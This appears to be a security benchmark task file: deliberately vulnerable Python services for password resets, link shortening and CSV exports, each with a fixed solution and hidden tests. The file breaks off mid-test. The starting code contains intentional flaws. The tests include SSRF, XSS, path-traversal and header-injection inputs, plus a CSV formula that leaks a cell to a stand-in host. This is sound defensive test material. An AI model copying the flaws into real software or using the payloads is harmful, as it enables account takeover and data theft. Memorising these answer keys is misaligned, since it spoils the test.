"""Security family: multi-flaw services. Each task is a small but complete in-process service (password reset, link shortener, report export, file sharing,
payment webhooks) with several interacting weaknesses; hidden tests exercise every one of them and the legitimate flows."""
from fx import dd, family

from . import _sec
from ._sec import readme

P = _sec.PY_PRELUDE

FL = []

# =================================================================================================================================
#  password reset
# =================================================================================================================================
PORTAL = dd(r'''
    """Accounts and password resets of the customer portal (in-process model)."""
    import hashlib
    import time

    SITE_HOST = "accounts.example.com"


    class AuthService:
        def __init__(self, clock=time.time):
            self.clock = clock
            self.users = {}       # username -> {"email": ..., "password": stored password record}
            self.sessions = {}    # session id -> username
            self.outbox = []      # (to, subject, body) of every mail sent
            self.resets = {}      # reset token -> {"user": username, "issued": time}

        def register(self, username, email, password):
            """Create an account; ValueError when the name is taken. Passwords need at least 10 characters (ValueError otherwise)."""
            if username in self.users:
                raise ValueError("name taken")
            self.users[username] = {"email": email, "password": hashlib.sha1(password.encode()).hexdigest()}

        def login(self, username, password):
            """A new session id for correct credentials (PermissionError for anything else)."""
            user = self.users.get(username)
            if user is None or user["password"] != hashlib.sha1(password.encode()).hexdigest():
                raise PermissionError("invalid credentials")
            sid = hashlib.md5(("%s%f" % (username, self.clock())).encode()).hexdigest()
            self.sessions[sid] = username
            return sid

        def whoami(self, sid):
            return self.sessions.get(sid)

        def request_reset(self, email, headers):
            """Start a password reset for the account with this address; `headers` are the request headers. Returns (status, body)."""
            for name, user in self.users.items():
                if user["email"] == email:
                    token = hashlib.md5((email + str(int(self.clock()))).encode()).hexdigest()
                    self.resets[token] = {"user": name, "issued": self.clock()}
                    link = "https://%s/reset?token=%s" % (headers.get("Host", SITE_HOST), token)
                    self.outbox.append((email, "Reset your password", "Use this link to choose a new password: " + link))
                    return 200, {"message": "mail sent"}
            return 404, {"error": "unknown address"}

        def redeem_reset(self, token, new_password):
            """Set a new password with a reset token (None on success, ValueError otherwise)."""
            entry = self.resets.get(token)
            if entry is None:
                raise ValueError("invalid token")
            self.users[entry["user"]]["password"] = hashlib.sha1(new_password.encode()).hexdigest()
''')

PORTAL_FIXED = dd(r'''
    """Accounts and password resets of the customer portal (in-process model)."""
    import hashlib
    import hmac
    import os
    import secrets
    import time

    SITE_HOST = "accounts.example.com"
    ITERATIONS = 100_000
    RESET_TTL = 3600
    RESET_LIMIT = 3


    def _hash_password(password):
        salt = os.urandom(16)
        digest = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, ITERATIONS)
        return "pbkdf2_sha256$%d$%s$%s" % (ITERATIONS, salt.hex(), digest.hex())


    def _check_password(record, password):
        try:
            _, iterations, salt, digest = record.split("$")
            candidate = hashlib.pbkdf2_hmac("sha256", password.encode(), bytes.fromhex(salt), int(iterations))
        except ValueError:
            return False
        return hmac.compare_digest(candidate.hex(), digest)


    class AuthService:
        def __init__(self, clock=time.time):
            self.clock = clock
            self.users = {}       # username -> {"email": ..., "password": stored password record}
            self.sessions = {}    # session id -> username
            self.outbox = []      # (to, subject, body) of every mail sent
            self.resets = {}      # sha256 hex of the reset token -> {"user": username, "issued": time}
            self.reset_log = {}   # email -> times of the reset mails sent

        def register(self, username, email, password):
            """Create an account; ValueError when the name is taken. Passwords need at least 10 characters (ValueError otherwise)."""
            if username in self.users:
                raise ValueError("name taken")
            if len(password) < 10:
                raise ValueError("password too short")
            self.users[username] = {"email": email, "password": _hash_password(password)}

        def login(self, username, password):
            """A new session id for correct credentials (PermissionError for anything else)."""
            user = self.users.get(username)
            if user is None or not _check_password(user["password"], password):
                raise PermissionError("invalid credentials")
            sid = secrets.token_hex(16)
            self.sessions[sid] = username
            return sid

        def whoami(self, sid):
            return self.sessions.get(sid)

        def request_reset(self, email, headers):
            """Start a password reset for the account with this address; `headers` are the request headers. Returns (status, body)."""
            now = self.clock()
            sent = [t for t in self.reset_log.get(email, []) if now - t < 3600]
            name = next((n for n, u in self.users.items() if u["email"] == email), None)
            if name is not None and len(sent) < RESET_LIMIT:
                token = secrets.token_urlsafe(32)
                for key in [k for k, v in self.resets.items() if v["user"] == name]:
                    del self.resets[key]
                self.resets[hashlib.sha256(token.encode()).hexdigest()] = {"user": name, "issued": now}
                sent.append(now)
                self.reset_log[email] = sent
                link = "https://%s/reset?token=%s" % (SITE_HOST, token)
                self.outbox.append((email, "Reset your password", "Use this link to choose a new password: " + link))
            return 202, {"message": "if the address is registered, a mail is on its way"}

        def redeem_reset(self, token, new_password):
            """Set a new password with a reset token (None on success, ValueError otherwise)."""
            key = hashlib.sha256(str(token).encode()).hexdigest()
            entry = self.resets.get(key)
            if entry is None or self.clock() - entry["issued"] >= RESET_TTL:
                self.resets.pop(key, None)
                raise ValueError("invalid token")
            if len(new_password) < 10:
                raise ValueError("password too short")
            self.users[entry["user"]]["password"] = _hash_password(new_password)
            del self.resets[key]
            for sid in [s for s, u in self.sessions.items() if u == entry["user"]]:
                del self.sessions[sid]
''')

FL.append(dict(
    slug="password-reset-flow", d=4, product="the customer portal", func="AuthService", cwe="CWE-640",
    finding="the account and reset flow has several weaknesses that add up to account takeover: passwords are stored as unsalted SHA-1 and any length is accepted, session ids are `md5(user + time)`, the reset endpoint tells attackers which e-mail addresses have accounts, the reset token is `md5(email + timestamp)` (predictable, stored in clear, never expires, reusable), the reset link takes its host from the `Host` header (so a forged header sends the victim's token to the attacker), resets do not end existing sessions, and nothing limits reset mails.",
    start={"portal.py": PORTAL, "README.md": readme("customer portal", dd(r'''
        The service keeps its API (`register`, `login`, `whoami`, `request_reset`, `redeem_reset`, the attributes `users`, `sessions`, `outbox`, `resets`) and must meet this baseline:

        * **Passwords**: `users[name]["password"]` is `pbkdf2_sha256$<iterations>$<salt hex>$<hash hex>` (PBKDF2-HMAC-SHA256, fresh 16-byte salt, at least 100000 iterations); `register` refuses passwords shorter than 10 characters; comparisons are constant-time.
        * **Sessions**: `login` returns 32 lower-case hex characters (128 random bits from a secure source).
        * **Reset request**: the answer is always `(202, {"message": "if the address is registered, a mail is on its way"})`. A mail `(address, "Reset your password", body)` is queued only for registered addresses and at most 3 times per address and rolling hour (more requests get the same answer, no mail, no token).
          The body contains `https://accounts.example.com/reset?token=<token>`: the host is `SITE_HOST`, whatever the request headers say. The token is `secrets.token_urlsafe(32)`; `resets` is keyed by the SHA-256 hex digest of the token (never the token itself) and a new request for a user invalidates that user's earlier tokens.
        * **Redeeming**: a token works once, for one hour (expired when `now - issued >= 3600`). Success changes the password (same length rule), consumes the token and ends every session of that user; a wrong, expired or used token raises `ValueError("invalid token")`; a too-short password raises `ValueError` and leaves the token usable.
    '''))},
    solution={"portal.py": PORTAL_FIXED},
    hidden={"tests/test_portal_security.py": P + dd(r'''
        import hashlib
        import re

        import portal as m


        class Clock:
            def __init__(self):
                self.t = 1_700_000_000.0

            def __call__(self):
                return self.t


        def token_of(body):
            return re.search(r"token=([A-Za-z0-9_\-]+)", body).group(1)


        class PortalTest(unittest.TestCase):
            def make(self):
                c = Clock()
                s = m.AuthService(clock=c)
                s.register("ann", "ann@example.com", "correct horse 1")
                s.register("bob", "bob@example.com", "battery staple 2")
                return s, c

            def test_accounts(self):
                s, c = self.make()
                self.assertRaises(ValueError, s.register, "ann", "x@example.com", "another long password")
                for short in ("short", "123456789", ""):
                    self.assertRaises(ValueError, s.register, "cat", "cat@example.com", short)
                self.assertNotIn("cat", s.users)
                s.register("dan", "dan@example.com", "ten chars!!")
                sid = s.login("ann", "correct horse 1")
                self.assertRegex(sid, r"^[0-9a-f]{32}$")
                self.assertEqual(s.whoami(sid), "ann")
                for name, pw in (("ann", "wrong"), ("nobody", "correct horse 1"), ("ann", ""), ("bob", "correct horse 1")):
                    self.assertIsNone(attempt(s.login, name, pw))
                scheme, iterations, salt, digest = s.users["ann"]["password"].split("$")
                self.assertEqual(scheme, "pbkdf2_sha256")
                self.assertGreaterEqual(int(iterations), 100000)
                self.assertEqual(len(bytes.fromhex(salt)), 16)
                self.assertEqual(hashlib.pbkdf2_hmac("sha256", b"correct horse 1", bytes.fromhex(salt), int(iterations)).hex(), digest)
                s.register("eve", "eve@example.com", "correct horse 1")
                self.assertNotEqual(s.users["eve"]["password"], s.users["ann"]["password"])
                self.assertNotIn(hashlib.sha1(b"correct horse 1").hexdigest(), repr(s.users))

            def test_session_ids_are_unpredictable(self):
                s, c = self.make()
                ids = {s.login("ann", "correct horse 1") for _ in range(20)}
                self.assertEqual(len(ids), 20)
                guesses = {hashlib.md5(("ann%f" % c.t).encode()).hexdigest(), hashlib.md5(("ann%d" % c.t).encode()).hexdigest(), hashlib.md5(b"ann").hexdigest()}
                self.assertFalse(ids & guesses)

            def test_reset_requests(self):
                s, c = self.make()
                known = s.request_reset("ann@example.com", {"Host": "evil.io"})
                unknown = s.request_reset("nobody@example.com", {"Host": "evil.io"})
                self.assertEqual(known, unknown)
                self.assertEqual(known, (202, {"message": "if the address is registered, a mail is on its way"}))
                self.assertEqual(len(s.outbox), 1)
                to, subject, body = s.outbox[0]
                self.assertEqual((to, subject), ("ann@example.com", "Reset your password"))
                self.assertIn("https://accounts.example.com/reset?token=", body)
                self.assertNotIn("evil.io", body)
                for headers in ({}, {"X-Forwarded-Host": "evil.io"}, {"Host": "accounts.example.com.evil.io"}, {"Host": "evil.io\r\nX: y"}):
                    s2, _ = self.make()
                    s2.request_reset("bob@example.com", headers)
                    self.assertIn("https://accounts.example.com/reset?token=", s2.outbox[0][2])
                    self.assertNotIn("evil", s2.outbox[0][2])

            def test_reset_rate_limit(self):
                s, c = self.make()
                for _ in range(5):
                    self.assertEqual(s.request_reset("ann@example.com", {})[0], 202)
                    c.t += 60
                self.assertEqual(len(s.outbox), 3)
                c.t += 3600
                s.request_reset("ann@example.com", {})
                self.assertEqual(len(s.outbox), 4)
                self.assertEqual(len([o for o in s.outbox if o[0] == "bob@example.com"]), 0)

            def test_tokens(self):
                s, c = self.make()
                s.request_reset("ann@example.com", {})
                t1 = token_of(s.outbox[-1][2])
                self.assertGreaterEqual(len(t1), 32)
                self.assertNotIn(t1, s.resets)
                self.assertIn(hashlib.sha256(t1.encode()).hexdigest(), s.resets)
                for guess in (hashlib.md5(("ann@example.com" + str(int(c.t))).encode()).hexdigest(), hashlib.md5(("ann@example.com" + str(int(c.t) - 1)).encode()).hexdigest()):
                    self.assertNotEqual(t1, guess)
                    self.assertRaises(ValueError, s.redeem_reset, guess, "new password 123")
                c.t += 1
                s.request_reset("ann@example.com", {})
                t2 = token_of(s.outbox[-1][2])
                self.assertNotEqual(t1, t2)
                self.assertRaises(ValueError, s.redeem_reset, t1, "new password 123")
                self.assertIsNone(s.redeem_reset(t2, "new password 123"))

            def test_redeeming(self):
                s, c = self.make()
                ann_session = s.login("ann", "correct horse 1")
                bob_session = s.login("bob", "battery staple 2")
                s.request_reset("ann@example.com", {})
                token = token_of(s.outbox[-1][2])
                self.assertRaises(ValueError, s.redeem_reset, token, "short")
                self.assertIsNone(s.redeem_reset(token, "brand new password"))
                self.assertIsNone(s.whoami(ann_session))
                self.assertEqual(s.whoami(bob_session), "bob")
                self.assertRaises(ValueError, s.redeem_reset, token, "another new password")
                self.assertIsNone(attempt(s.login, "ann", "correct horse 1"))
                self.assertEqual(s.whoami(s.login("ann", "brand new password")), "ann")

            def test_expiry(self):
                s, c = self.make()
                s.request_reset("bob@example.com", {})
                token = token_of(s.outbox[-1][2])
                c.t += 3599
                s.request_reset("nobody@example.com", {})
                self.assertIsNone(s.redeem_reset(token, "fresh enough pw"))
                s.request_reset("bob@example.com", {})
                token = token_of(s.outbox[-1][2])
                c.t += 3600
                self.assertRaises(ValueError, s.redeem_reset, token, "too late password")
                self.assertRaises(ValueError, s.redeem_reset, "", "whatever password")
                self.assertRaises(ValueError, s.redeem_reset, None, "whatever password")


        if __name__ == "__main__":
            unittest.main()
    ''')},
))

# =================================================================================================================================
#  link shortener
# =================================================================================================================================
SHORT = dd(r'''
    """Link shortener with preview pages (in-process model)."""
    import re


    def to_base36(n):
        digits = "0123456789abcdefghijklmnopqrstuvwxyz"
        out = ""
        while n:
            n, r = divmod(n, 36)
            out = digits[r] + out
        return out or "0"


    class Shortener:
        def __init__(self, fetch, resolve):
            """`fetch(url)` downloads a page and returns its HTML text; `resolve(host)` lists the IP addresses (text) of a host name."""
            self.fetch = fetch
            self.resolve = resolve
            self.links = {}
            self.counter = 0

        def create(self, user, url):
            """Create a short link for `url` on behalf of `user` and return its code."""
            self.counter += 1
            code = to_base36(self.counter)
            html = self.fetch(url)
            found = re.search(r"<title>(.*?)</title>", html, re.I | re.S)
            title = found.group(1).strip() if found else url
            self.links[code] = {"url": url, "owner": user, "title": title}
            return code

        def lookup(self, code):
            """The target URL of a code (KeyError for unknown codes)."""
            return self.links[code]["url"]

        def delete(self, user, code):
            """Remove a link."""
            del self.links[code]

        def info_page(self, code):
            """HTML preview page of a link."""
            link = self.links[code]
            return "<h1>%s</h1><a href='%s'>%s</a>" % (link["title"], link["url"], link["url"])
''')
SHORT_FIXED = dd(r'''
    """Link shortener with preview pages (in-process model)."""
    import html as htmllib
    import ipaddress
    import re
    import secrets
    from urllib.parse import urlsplit

    ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789"


    def to_base36(n):
        digits = "0123456789abcdefghijklmnopqrstuvwxyz"
        out = ""
        while n:
            n, r = divmod(n, 36)
            out = digits[r] + out
        return out or "0"


    def _public(addr):
        ip = ipaddress.ip_address(addr)
        if isinstance(ip, ipaddress.IPv6Address) and ip.ipv4_mapped is not None:
            ip = ip.ipv4_mapped
        return ip.is_global and not ip.is_multicast


    class Shortener:
        def __init__(self, fetch, resolve):
            """`fetch(url)` downloads a page and returns its HTML text; `resolve(host)` lists the IP addresses (text) of a host name."""
            self.fetch = fetch
            self.resolve = resolve
            self.links = {}

        def _check(self, url):
            if not isinstance(url, str) or len(url) > 2048:
                raise ValueError("bad url")
            parts = urlsplit(url)
            if parts.scheme not in ("http", "https") or not parts.hostname or parts.username is not None or "\\" in url:
                raise ValueError("bad url")
            try:
                addrs = [str(ipaddress.ip_address(parts.hostname))]
            except ValueError:
                try:
                    addrs = list(self.resolve(parts.hostname))
                except OSError:
                    raise ValueError("unresolvable host")
            if not addrs or not all(_public(a) for a in addrs):
                raise ValueError("non-public host")
            return parts.hostname

        def create(self, user, url):
            """Create a short link for `url` on behalf of `user` and return its code."""
            host = self._check(url)
            page = self.fetch(url)
            found = re.search(r"<title>(.*?)</title>", page, re.I | re.S)
            title = " ".join(found.group(1).split())[:100] if found else ""
            while True:
                code = "".join(secrets.choice(ALPHABET) for _ in range(8))
                if code not in self.links:
                    break
            self.links[code] = {"url": url, "owner": user, "title": title or host}
            return code

        def lookup(self, code):
            """The target URL of a code (KeyError for unknown codes)."""
            return self.links[code]["url"]

        def delete(self, user, code):
            """Remove a link."""
            if self.links[code]["owner"] != user:
                raise PermissionError("not your link")
            del self.links[code]

        def info_page(self, code):
            """HTML preview page of a link."""
            link = self.links[code]
            return '<h1>%s</h1><a href="%s">%s</a>' % (htmllib.escape(link["title"]), htmllib.escape(link["url"], quote=True), htmllib.escape(link["url"]))
''')
FL.append(dict(
    slug="link-shortener", d=4, product="the link shortener", func="Shortener", cwe="CWE-918",
    finding="`create` fetches whatever URL a user submits (internal addresses, `file:` and `gopher:` URLs: SSRF) and stores `javascript:` URLs; short codes are sequential base-36 counters that anyone can enumerate; the preview page writes the fetched page title and the URL into HTML unescaped (stored XSS); and `delete` removes anybody's link.",
    start={"shortener.py": SHORT, "README.md": readme("link shortener", dd(r'''
        Baseline (the API stays: `create`, `lookup`, `delete`, `info_page`, `links`):

        * `create(user, url)` accepts only `http`/`https` URLs of at most 2048 characters with a host name, no user info and no backslash. Every address of the host (`resolve(host)`, or the literal address) must be globally routable (not loopback, private, link-local, shared, unspecified or multicast; IPv4-mapped IPv6 counts as the IPv4 address). Anything else is a `ValueError` raised *before* `fetch` is called; `fetch` is called once for accepted URLs.
        * The title is the first 100 characters of the page's `<title>` with runs of whitespace collapsed to single spaces; without a title the host name is used.
        * Codes are 8 random characters from `a-z0-9` (secure source, never reused).
        * `info_page(code)` returns exactly `<h1>TITLE</h1><a href="URL">URL</a>` with both values HTML-escaped (quotes included).
        * `delete(user, code)` only for the link's owner (`PermissionError`); unknown codes raise `KeyError`.
    '''))},
    solution={"shortener.py": SHORT_FIXED},
    hidden={"tests/test_shortener_security.py": P + dd(r'''
        import socket
        from html.parser import HTMLParser

        import shortener as m

        TABLE = {"news.example": ["93.184.216.34"], "dual.example": ["93.184.216.34", "2606:2800:220:1:248:1893:25c8:1946"], "intranet.example": ["10.0.0.7"], "mixed.example": ["93.184.216.34", "192.168.1.5"],
                 "meta.example": ["169.254.169.254"], "v6.example": ["fd00::9"], "local.example": ["127.0.0.1"]}


        def resolve(host):
            if host in TABLE:
                return list(TABLE[host])
            try:
                return [socket.inet_ntoa(socket.inet_aton(host))]
            except OSError:
                raise OSError("cannot resolve " + host)


        class Fetcher:
            def __init__(self, html="<html><title>Hello</title></html>"):
                self.calls = []
                self.html = html

            def __call__(self, url):
                self.calls.append(url)
                return self.html


        class Collector(HTMLParser):
            def __init__(self):
                super().__init__(convert_charrefs=True)
                self.tags, self.text = [], ""

            def handle_starttag(self, tag, attrs):
                self.tags.append((tag, attrs))

            def handle_data(self, data):
                self.text += data


        class ShortenerTest(unittest.TestCase):
            def test_creation_and_lookup(self):
                f = Fetcher("<html><head><TITLE>\n  A   Nice \t Page </TITLE></head></html>")
                s = m.Shortener(f, resolve)
                code = s.create("ann", "https://news.example/a?b=1#c")
                self.assertRegex(code, r"^[a-z0-9]{8}$")
                self.assertEqual(f.calls, ["https://news.example/a?b=1#c"])
                self.assertEqual(s.lookup(code), "https://news.example/a?b=1#c")
                self.assertEqual(s.info_page(code), '<h1>A Nice Page</h1><a href="https://news.example/a?b=1#c">https://news.example/a?b=1#c</a>')
                for url in ("http://dual.example:8080/x", "http://8.8.8.8/x", "http://[2606:4700:4700::1111]/x", "HTTPS://News.Example/UP"):
                    s.create("ann", url)
                s2 = m.Shortener(Fetcher("<p>no title</p>"), resolve)
                self.assertIn("<h1>news.example</h1>", s2.info_page(s2.create("ann", "https://news.example/")))
                s3 = m.Shortener(Fetcher("<title>" + "t" * 500 + "</title>"), resolve)
                self.assertIn("<h1>" + "t" * 100 + "</h1>", s3.info_page(s3.create("ann", "https://news.example/")))
                self.assertRaises(KeyError, s.lookup, "zzzzzzzz")

            def test_urls_that_must_not_be_fetched(self):
                bad = ["http://127.0.0.1/", "http://localhost/", "http://local.example/", "http://intranet.example/", "http://mixed.example/", "http://meta.example/latest/meta-data/", "http://v6.example/", "http://[::1]/",
                       "http://[::ffff:10.0.0.1]/", "http://2130706433/", "http://0x7f000001/", "http://127.1/", "http://169.254.169.254/", "http://172.16.0.1/", "http://100.64.0.1/", "javascript:alert(1)", "file:///etc/passwd",
                       "ftp://news.example/x", "gopher://news.example/_x", "//news.example/x", "news.example/x", "https://user:pw@news.example/", "https://news.example\\@evil.example/", "https://" + "a" * 2050, "", "http://", "data:text/html,x"]
                for url in bad:
                    f = Fetcher()
                    s = m.Shortener(f, resolve)
                    self.assertIsNone(attempt(s.create, "ann", url), url)
                    self.assertEqual(f.calls, [], url)
                    self.assertEqual(s.links, {}, url)
                for value in (None, 5, ["https://news.example/"]):
                    self.assertIsNone(attempt(m.Shortener(Fetcher(), resolve).create, "ann", value))

            def test_codes_are_unpredictable(self):
                s = m.Shortener(Fetcher(), resolve)
                codes = [s.create("ann", "https://news.example/%d" % i) for i in range(300)]
                self.assertEqual(len(set(codes)), 300)
                counters = {m.to_base36(i) for i in range(0, 2000)} | {m.to_base36(i).zfill(8) for i in range(0, 2000)}
                self.assertFalse(set(codes) & counters)
                self.assertGreater(len({c[0] for c in codes}), 10)
                self.assertNotEqual(codes, sorted(codes))

            def test_preview_page_is_inert(self):
                titles = ["<script>alert(1)</script>", "</h1><img src=x onerror=alert(1)>", "Tom & Jerry's \"Best\" <b>show</b>", "&lt;already&gt;"]
                for title in titles:
                    s = m.Shortener(Fetcher("<title>" + title + "</title>"), resolve)
                    code = s.create("ann", "https://news.example/p?a=1&b=\"2\"")
                    page = s.info_page(code)
                    p = Collector()
                    p.feed(page)
                    self.assertEqual([t for t, _ in p.tags], ["h1", "a"], page)
                    self.assertEqual(dict(p.tags[1][1]), {"href": "https://news.example/p?a=1&b=\"2\""})
                    self.assertNotIn("<script", page)
                    self.assertNotIn("<img", page)

            def test_only_owners_delete(self):
                s = m.Shortener(Fetcher(), resolve)
                code = s.create("ann", "https://news.example/")
                for user in ("bob", "", "ANN", None):
                    self.assertIsNone(attempt(s.delete, user, code))
                self.assertIn(code, s.links)
                with self.assertRaises(PermissionError):
                    s.delete("bob", code)
                s.delete("ann", code)
                self.assertNotIn(code, s.links)
                self.assertRaises(KeyError, s.delete, "ann", code)


        if __name__ == "__main__":
            unittest.main()
    ''')},
))

# =================================================================================================================================
#  report export
# =================================================================================================================================
EXPORT = dd(r'''
    """Order exports of the shop back office (in-process model)."""
    import csv
    import io
    import os


    class ExportService:
        def __init__(self, orders, export_dir):
            """`orders` is a list of dicts with `id`, `owner` (user name), `customer`, `note` (strings) and `amount` (a number)."""
            self.orders = {o["id"]: o for o in orders}
            self.export_dir = export_dir

        def export_csv(self, user, order_ids=None):
            """CSV text (csv module defaults) with the header `id,customer,note,amount` and one row per order. `user` is a dict with `name` and `role`: customers get their own orders, admins (`role == "admin"`) all."""
            ids = order_ids if order_ids is not None else sorted(self.orders)
            out = io.StringIO()
            writer = csv.writer(out)
            writer.writerow(["id", "customer", "note", "amount"])
            for oid in ids:
                o = self.orders[oid]
                writer.writerow([o["id"], o["customer"], o["note"], o["amount"]])
            return out.getvalue()

        def save_export(self, user, name, text):
            """Write the export text to `<export_dir>/<user name>/<name>` and return the path."""
            path = os.path.join(self.export_dir, user["name"], name)
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(text)
            return path

        def download_headers(self, name):
            """Response headers for downloading a saved export."""
            return {"Content-Type": "text/csv", "Content-Disposition": 'attachment; filename="%s"' % name}
''')
EXPORT_FIXED = dd(r'''
    """Order exports of the shop back office (in-process model)."""
    import csv
    import io
    import os
    import re

    MAX_ROWS = 10_000
    NAME = re.compile(r"[A-Za-z0-9_-][A-Za-z0-9._-]{0,63}")
    USER = re.compile(r"[a-z0-9_]{1,32}")


    def _cell(value):
        if isinstance(value, str) and value[:1] in ("=", "+", "-", "@", "\t", "\r"):
            return "'" + value
        return value


    class ExportService:
        def __init__(self, orders, export_dir):
            """`orders` is a list of dicts with `id`, `owner` (user name), `customer`, `note` (strings) and `amount` (a number)."""
            self.orders = {o["id"]: o for o in orders}
            self.export_dir = export_dir

        def export_csv(self, user, order_ids=None):
            """CSV text (csv module defaults) with the header `id,customer,note,amount` and one row per order. `user` is a dict with `name` and `role`: customers get their own orders, admins (`role == "admin"`) all."""
            admin = user.get("role") == "admin"
            if order_ids is None:
                ids = sorted(oid for oid, o in self.orders.items() if admin or o["owner"] == user.get("name"))
            else:
                ids = list(order_ids)
                for oid in ids:
                    if oid not in self.orders:
                        raise KeyError(oid)
                    if not admin and self.orders[oid]["owner"] != user.get("name"):
                        raise PermissionError("not your order")
            if len(ids) > MAX_ROWS:
                raise ValueError("too many rows")
            out = io.StringIO()
            writer = csv.writer(out)
            writer.writerow(["id", "customer", "note", "amount"])
            for oid in ids:
                o = self.orders[oid]
                writer.writerow([_cell(o["id"]), _cell(o["customer"]), _cell(o["note"]), o["amount"]])
            return out.getvalue()

        def save_export(self, user, name, text):
            """Write the export text to `<export_dir>/<user name>/<name>` and return the path."""
            if not USER.fullmatch(str(user.get("name"))) or not isinstance(name, str) or not NAME.fullmatch(name):
                raise ValueError("bad user or file name")
            directory = os.path.join(self.export_dir, user["name"])
            os.makedirs(directory, exist_ok=True)
            path = os.path.join(directory, name)
            fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC | os.O_NOFOLLOW, 0o644)
            with os.fdopen(fd, "w", encoding="utf-8") as fh:
                fh.write(text)
            return path

        def download_headers(self, name):
            """Response headers for downloading a saved export."""
            if not isinstance(name, str) or not NAME.fullmatch(name):
                raise ValueError("bad file name")
            return {"Content-Type": "text/csv; charset=utf-8", "Content-Disposition": 'attachment; filename="%s"' % name, "X-Content-Type-Options": "nosniff"}
''')
FL.append(dict(
    slug="report-export", d=4, product="the shop back office", func="ExportService", cwe="CWE-1236",
    finding="the order export writes customer-controlled text straight into CSV cells (formulas run when the finance team opens the file), lets customers export other customers' orders by passing their ids, has no limit on the number of rows, saves files under names taken from the request (`../../` escapes the export directory, links are followed), and builds the download headers from the same unchecked name.",
    start={"exports.py": EXPORT, "README.md": readme("order exports", dd(r'''
        Baseline (API unchanged: `export_csv`, `save_export`, `download_headers`):

        * `export_csv(user, order_ids=None)`: without ids a customer gets their own orders (sorted by id), an admin all of them; with ids the customer must own every one (`PermissionError`, nothing exported; an unknown id is `KeyError`, checked before ownership of later ids matters - the first problem in list order wins); more than 10000 rows are a `ValueError`.
          String cells that start with `=`, `+`, `-`, `@`, a tab or a carriage return are written with a leading single quote; numbers (the amount) stay numbers.
        * `save_export(user, name, text)`: the user name must match `[a-z0-9_]{1,32}` and the file name `[A-Za-z0-9_-][A-Za-z0-9._-]{0,63}`, else `ValueError`; the file is written as `<export_dir>/<user>/<name>` without ever following a symbolic link; an existing regular file is overwritten.
        * `download_headers(name)` returns `Content-Type: text/csv; charset=utf-8`, `Content-Disposition: attachment; filename="<name>"` and `X-Content-Type-Options: nosniff` for valid names (same name rule) and raises `ValueError` otherwise.
    '''))},
    solution={"exports.py": EXPORT_FIXED},
    hidden={"tests/test_exports_security.py": P + dd(r'''
        import csv
        import io

        import exports as m

        ORDERS = [{"id": 1, "owner": "ann", "customer": "Ann A", "note": "gift", "amount": 10.5}, {"id": 2, "owner": "bob", "customer": "=HYPERLINK(\"http://evil.example/?\"&A1,\"x\")", "note": "+1+1", "amount": -5},
                  {"id": 3, "owner": "ann", "customer": "@SUM(A1:A9)", "note": "-2+3", "amount": 7}, {"id": 4, "owner": "carol", "customer": "ok", "note": "\t=1", "amount": 1}]
        ANN, BOB, ADMIN = {"name": "ann", "role": "user"}, {"name": "bob", "role": "user"}, {"name": "root", "role": "admin"}


        def rows(text):
            return list(csv.reader(io.StringIO(text, newline="")))


        class ExportTest(unittest.TestCase):
            def setUp(self):
                self.base = tmpdir()
                self.addCleanup(shutil.rmtree, self.base, True)
                self.dir = os.path.join(self.base, "exports")
                os.makedirs(self.dir)
                self.svc = m.ExportService([dict(o) for o in ORDERS], self.dir)

            def test_scope_and_cells(self):
                self.assertEqual(rows(self.svc.export_csv(ANN)), [["id", "customer", "note", "amount"], ["1", "Ann A", "gift", "10.5"], ["3", "'@SUM(A1:A9)", "'-2+3", "7"]])
                got = rows(self.svc.export_csv(BOB))
                self.assertEqual(got[1], ["2", "'=HYPERLINK(\"http://evil.example/?\"&A1,\"x\")", "'+1+1", "-5"])
                self.assertEqual([r[0] for r in rows(self.svc.export_csv(ADMIN))], ["id", "1", "2", "3", "4"])
                self.assertEqual(rows(self.svc.export_csv(ADMIN))[4], ["4", "ok", "'\t=1", "1"])
                self.assertEqual([r[0] for r in rows(self.svc.export_csv(ADMIN, [3, 1]))], ["id", "3", "1"])
                self.assertEqual([r[0] for r in rows(self.svc.export_csv(ANN, [3]))], ["id", "3"])

            def test_other_peoples_orders(self):
                for ids in ([2], [1, 2], [4, 1], [1, 3, 4]):
                    self.assertIsNone(attempt(self.svc.export_csv, ANN, ids), ids)
                with self.assertRaises(PermissionError):
                    self.svc.export_csv(ANN, [1, 2])
                with self.assertRaises(KeyError):
                    self.svc.export_csv(ANN, [1, 99])
                with self.assertRaises(KeyError):
                    self.svc.export_csv(ADMIN, [99])

            def test_row_limit(self):
                many = [{"id": i, "owner": "ann", "customer": "c", "note": "n", "amount": 1} for i in range(10001)]
                svc = m.ExportService(many, self.dir)
                with self.assertRaises(ValueError):
                    svc.export_csv(ANN)
                self.assertEqual(len(rows(svc.export_csv(ANN, list(range(10000))))), 10001)
                with self.assertRaises(ValueError):
                    svc.export_csv(ADMIN, list(range(10001)))

            def test_saving(self):
                path = self.svc.save_export(ANN, "march.csv", "a,b\n")
                self.assertEqual(path, os.path.join(self.dir, "ann", "march.csv"))
                self.assertEqual(read(path), b"a,b\n")
                self.svc.save_export(ANN, "march.csv", "new")
                self.assertEqual(read(path), b"new")
                for name in ["../../escape.csv", "/abs.csv", "a/b.csv", "..", ".hidden", "", "x" * 65, "a b.csv", "a\x00b", "a;b", "..\\x"]:
                    self.assertIsNone(attempt(self.svc.save_export, ANN, name, "x"), repr(name))
                for user in ({"name": "../x", "role": "user"}, {"name": "Ann", "role": "user"}, {"name": "", "role": "user"}, {"name": "a" * 40, "role": "user"}, {"name": None, "role": "user"}):
                    self.assertIsNone(attempt(self.svc.save_export, user, "ok.csv", "x"), user)
                self.assertEqual(sorted(os.listdir(self.base)), ["exports"])
                self.assertEqual(sorted(os.listdir(os.path.join(self.dir, "ann"))), ["march.csv"])

            def test_links_are_not_followed(self):
                secret = os.path.join(self.base, "secret.txt")
                write(secret, "original secret")
                os.makedirs(os.path.join(self.dir, "ann"))
                os.symlink(secret, os.path.join(self.dir, "ann", "report.csv"))
                self.assertIsNone(attempt(self.svc.save_export, ANN, "report.csv", "pwned"))
                self.assertEqual(read(secret), b"original secret")

            def test_download_headers(self):
                self.assertEqual(self.svc.download_headers("march.csv"), {"Content-Type": "text/csv; charset=utf-8", "Content-Disposition": 'attachment; filename="march.csv"', "X-Content-Type-Options": "nosniff"})
                for name in ['a"b.csv', "x\r\nSet-Cookie: a=b", "a;b", "../x", "", "x" * 65, ".x", None, 5]:
